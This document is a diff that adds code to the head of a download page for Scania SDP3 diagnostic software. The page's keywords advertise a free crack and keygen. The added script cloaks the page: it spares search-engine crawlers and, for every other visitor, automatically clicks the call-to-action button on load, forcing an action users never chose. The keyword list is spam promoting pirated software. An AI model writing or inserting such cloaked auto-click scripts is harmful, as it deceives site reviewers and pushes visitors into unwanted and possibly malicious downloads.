@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scania SDP3 2.61.1.5 Industrial &amp; Marine 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Scania SDP3 2.61.1.5 Industrial &amp; Marine software for diagnostics and programming, version 06.2024. Free download in multiple languages.">
     <meta name="keywords" content="Scania SDP3 2.61.1.5, Scania SDP3 2.61.1.5 download, Scania SDP3 2.61.1.5 free download, Scania SDP3 2.61.1.5 crack, Scania SDP3 2.61.1.5 high speed download, Scania SDP3 2.61.1.5 keygen, Scania SDP3 06.2024, Scania SDP3 2024 download, Scania SDP3 diagnostic software, Scania SDP3 diagnostic software download, Scania SDP3 diagnostic software free, Scania SDP3 diagnostic software 2024, Scania SDP3 diagnostic software crack, Scania SDP3 diagnostic software keygen, industrial diagnostic software, marine diagnostic software, Scania SDP3 industrial software, Scania SDP3 marine software, Scania SDP3 industrial marine, Scania SDP3 update, Scania SDP3 troubleshooting, Scania SDP3 calibration, скачать Scania SDP3 2.61.1.5 бесплатно, Scania SDP3 2.61.1.5 скачать, Scania SDP3 промышленное морское 06.2024, Scania SDP3 программное обеспечение, Scania SDP3 диагностика скачать бесплатно, Загрузить бесплатно Scania SDP3 06.2024, Сканировать SDP3 диагностика, Scania SDP3 диагностическое программное обеспечение, Scania SDP3 diagnostic software keygen, Scania SDP3 diagnostic software download free, Scania diagnostic software free download, Scania diagnostic software keygen, Scania SDP3 software, Scania SDP3 download, Scania SDP3 free download, Scania SDP3 crack, Scania SDP3 high speed download">
     <style>
